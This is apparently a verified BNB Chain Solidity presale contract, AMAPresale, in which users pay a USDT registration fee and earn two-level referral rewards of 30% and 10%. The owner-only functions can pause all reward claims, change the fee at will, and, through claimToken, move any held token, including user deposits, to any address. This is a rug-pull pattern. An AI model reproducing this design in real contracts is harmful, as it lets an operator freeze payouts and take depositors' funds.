/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AMAPresale is Ownable {
    using SafeMath for uint256;
    struct UserInfo {
        //邀请一级用户
        uint256 firstAccount;
        //邀请二级级用户
        uint256 secondAccount;
        //邀请用户奖励
        uint256 usdtReward;
        //用户上级
        address invitor;
        //已领取奖励
        uint256 claimedReward;
        //注册时间
        uint256 regTime;
    }
    mapping(address => bool) public isFirst;
    //usdt合约地址
    address private _usdtAddress;
    //1代邀请奖励30%
    uint256 public _firstFee = 30;
    //2代邀请奖励10%
    uint256 public _secondFee = 10;
    mapping(address => UserInfo) private _userInfo;
    address[] private  userList;
    //官方账户
    address public OwnerAddress;

    //邀请映射
    mapping(address => address) public invitors;

    uint256 public usdtUnit;

    bool public _pauseClaim;

   //暂停注册
    bool public _pauseReg;

    uint256 public RegPrice;

   


    constructor(
        address USDTAddress, address CashAddress
    ){
        _usdtAddress = USDTAddress;
        OwnerAddress = CashAddress;
        usdtUnit = 10 ** IERC20(USDTAddress).decimals();
        RegPrice = 100;
        isFirst[address(0x000000000000000000000000000000000000dEaD)] = true;
        
    }

    function Regsiter(address invitor) external {
        //暂停注册
        require(!_pauseReg, "pauseReg");
        UserInfo storage userInfo = _userInfo[msg.sender];
        require(!isFirst[msg.sender],"registered");
        require(isFirst[invitor],"invitor error");
        if(invitor == address(0x000000000000000000000000000000000000dEaD)){
            invitor = OwnerAddress;
        }
        userInfo.invitor = invitor;
        invitors[msg.sender] = invitor;
        _userInfo[invitor].firstAccount += 1;
        address firstInvitor = invitors[invitor];
        _userInfo[firstInvitor].secondAccount += 1;
        uint256 amount = RegPrice * usdtUnit;
        if(amount>0){
            address cur = msg.sender;
            for (int256 i = 0; i < 2; i++) {
            uint256 rate;
            if(i == 0) {
                rate = _firstFee;
            }
            if(i == 1) {
                rate = _secondFee;
            }
            cur = invitors[cur];
            if (cur != address(0)) {
                _userInfo[cur].usdtReward += amount.mul(rate).div(100);
                }
            }
        }
        userList.push(msg.sender);
        IERC20(_usdtAddress).transferFrom(msg.sender,address(this),amount);
        isFirst[msg.sender] = true;
    }

   

    
    //领取奖励释放的代币
    function claimReward() external {
        require(!_pauseClaim,"can not claim");
        UserInfo storage userInfo = _userInfo[msg.sender];
        uint256 reward = userInfo.usdtReward.sub(userInfo.claimedReward);
        require(reward>0,"nothing to claim");
        IERC20(_usdtAddress).transfer(msg.sender,reward);
        userInfo.claimedReward += reward;
    }



    //暂停提币
    function setPauseClaim(bool pause) external onlyOwner {
        _pauseClaim = pause;
    }

    //暂停注册
    function setPauseReg(bool pause) external onlyOwner {
        _pauseReg = pause;
    }


    //设置注册usdt金额
    function setRegPrice(uint256 regPrice) external onlyOwner {
        RegPrice = regPrice;
    }
    
    
    //获取当前注册者人数
    function getUserListLength() external view returns (uint256){
        return userList.length;
    }

    function getUserInfo(address account) external view returns (UserInfo memory){
        UserInfo memory userInfo = _userInfo[account];
        return userInfo;
    }


    function claimToken(address token, address to, uint256 amount) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
}